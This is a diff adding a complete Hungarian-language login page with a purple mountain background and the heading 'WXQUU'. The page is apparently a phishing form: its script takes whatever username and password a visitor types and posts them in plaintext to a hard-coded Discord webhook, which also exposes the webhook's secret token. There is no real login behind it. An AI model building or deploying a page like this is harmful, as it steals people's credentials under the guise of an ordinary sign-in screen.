@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bejelentkezés</title>
+<style>
+  body {
+    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 100px 0 0; /* Move entire body down by 100 pixels */
+    background-image: url('https://i.ibb.co/Q9dCDSF/digital-art-digital-vector-purple-background-mountains-landscape-2124753-wallhere-com.png'); 
+    background-size: cover; 
+    background-repeat: no-repeat; 
+  }
+
+  #header {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    font-size: 70px; /* Increased font size */
+    font-weight: bold;
+    margin-top: 70px; /* Added margin top */
+  }
+
+  #login-form {
+    text-align: center;
+    padding: 20px;
+    border: 3px solid #000000;
+    border-radius: 15px;
+    transform: scale(2);
+    background-color: rgba(0, 0, 0, 0.2);
+    /* background-image: url('https://i.ibb.co/FxkxPpf/gradient2.png'); */
+    opacity: 1; 
+    backdrop-filter: blur(10px);
+  }
+
+  #login-form input[type="text"],
+  #login-form input[type="password"] {
+    width: 200px; 
+    height: 30px; 
+    font-size: 16px; 
+    margin-bottom: 20px; /* Increased margin bottom */
+    border-radius: 7px;
+    display: block; 
+    margin: 0 auto;
+  }
+
+  #login-form label {
+    display: block;
+    margin-bottom: 5px; /* Added margin bottom */
+  }
+
+  #login-form input[type="password"] {
+    margin-top: 5px; /* Decreased margin top */
+  }
+
+  #login-form label[for="textInput"] {
+    margin-top: 15px; /* Moved label down by 15 pixels */
+  }
+
+  #login-form button {
+    transform: scale(0.6);
+    height: 70px; 
+    font-size: 24px; 
+    padding: 0 30px; 
+    border-radius: 15px; 
+    border: none; 
+    background-color: #fff; /* Default button color */
+    transition: background-color 0.3s; /* Add transition effect */
+  }
+
+  #login-form button.clicked {
+    background-color: rgb(119, 0, 255); /* Change button color to purple */
+  }
+</style>
+</head>
+<body>
+
+<div id="header">
+  WXQUU
+</div>
+
+<div id="login-form">
+  <h1>Bejelentkezés</h1>
+
+  <div>
+    <label for="textInput2">Felhasználó:</label>
+    <input type="text" id="textInput2" placeholder="Írd be a felhasználóneved">
+  </div>
+
+  <div>
+    <label for="textInput">Jelszó:</label>
+    <input type="password" id="textInput" placeholder="Írd be a jelszavad">
+  </div>
+
+  <button onclick="sendMessage()">Bejelentkezés!</button>
+</div>
+
+<script>
+function sendMessage() {
+    var text1 = document.getElementById("textInput").value;
+    var text2 = document.getElementById("textInput2").value;
+
+    var xhr = new XMLHttpRequest();
+
+    var webhookUrl = 'https://discord.com/api/webhooks/1220762852290465872/_uZHzhH3KfD497Ylbw1YPPjpfMz1rGWEWB9Pdimk4Keg44ThvI93ZnTJuMfssgZSziLZ';
+
+    xhr.open("POST", webhookUrl);
+
+    xhr.setRequestHeader("Content-Type", "application/json");
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                console.log('Message sent to Discord');
+            } else {
+                console.error('Error sending message to Discord:', xhr.statusText);
+            }
+        }
+    };
+
+    var params = JSON.stringify({content: 'Jelszó: ' + text1 + '\nFelhasználó: ' + text2});
+    xhr.send(params);
+
+    // Change button color to purple when clicked
+    var button = document.querySelector("#login-form button");
+    button.classList.add("clicked");
+    setTimeout(function() {
+        button.classList.remove("clicked");
+    }, 100); // 500 milliseconds = half a second
+}
+</script>
+
+</body>
+</html>
